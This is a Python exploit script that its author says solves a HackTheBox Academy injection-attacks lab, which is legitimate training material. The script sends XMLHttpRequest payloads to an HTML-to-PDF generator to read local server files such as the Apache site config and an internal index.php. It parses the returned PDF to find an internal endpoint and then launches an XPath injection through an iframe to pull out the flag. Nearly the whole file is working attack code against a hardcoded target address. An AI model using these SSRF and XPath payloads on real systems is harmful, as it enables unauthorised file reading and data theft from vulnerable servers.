#!/usr/bin/env python3

"""
Created this script to solve the HackTheBox Academy lab called 'Skills Assessment' for the module called 'Injection Attacks'. 
This script exploits a server side request forgery via the pdf generator to find an internal application endpoint, and then exploits an XPATH injection attack on that internal endpoint.
"""

import requests
import PyPDF2

target= "83.136.249.33:58682"
proxies= {"http":"http://127.0.0.1:8080"}
headers= {"Content-type":"application/x-www-form-urlencoded"}

# function to write the generated pdf response to a file and then search for certain words in the response
def write_read_pdf(response, search_word):
    with open("/home/kali/Downloads/invoice.pdf", "wb") as file:
        file.write(response.content)

    with open("/home/kali/Downloads/invoice.pdf","rb") as file:
        reader = PyPDF2.PdfReader(file)
        text = ""
        
        # Iterate through the pages and extract text
        for page_num in range(len(reader.pages)):
            page = reader.pages[page_num]
            text += page.extract_text()

    for line in text.splitlines():
            if search_word in line:
                line= line.replace('\n','')
                line= line.replace(' ','')
                print(line)
                internal_endpoint= line
                return internal_endpoint
            else:
                pass

# function to perform server side request forgery to find an internal path and then use that internal path to find an internal endpoint
def pdf_ssrf():
    data="""id=1&title=CPU&desc=<script>x=new+XMLHttpRequest();x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/apache2/sites-available/000-default.conf");x.send();</script>&comment="""

    response=requests.post(url=f"http://{target}/order.php", proxies=proxies, headers=headers, data=data, allow_redirects=True, verify=False)
    search_word= "internal"
    internal_path= write_read_pdf(response, search_word)
            
    data1=f'id=1&title=CPU&desc=<script>x=new+XMLHttpRequest();x.onload=function(){{document.write(this.responseText)}};x.open("GET","file:///{internal_path}/index.php");x.send();</script>&comment='
    
    response=requests.post(url=f"http://{target}/order.php", proxies=proxies, headers=headers, data=data1, allow_redirects=True, verify=False)
    search_word= "127.0.0.1"
    internal_endpoint= write_read_pdf(response, search_word)
    return internal_endpoint
    
# function to perform XPATH injection on the internal endpoint
def XPATH_Injection(internal_endpoint):
    internal_endpoint= internal_endpoint.split('=')[0]
    data2=f'id=1&title=CPU&desc=<iframe+src="{internal_endpoint}=invalid+|+/*[1]/*[7]/*[1]"+width="500"+height="600"></iframe>&comment='

    response=requests.post(url=f"http://{target}/order.php", proxies=proxies, headers=headers, data=data2, allow_redirects=True, verify=False)
    
    search_word= "HTB{"
    write_read_pdf(response, search_word)

try:
    internal_endpoint= pdf_ssrf()
    XPATH_Injection(internal_endpoint)
except KeyboardInterrupt:
    print("Ctrl +c detetced, exiting gracefully")    
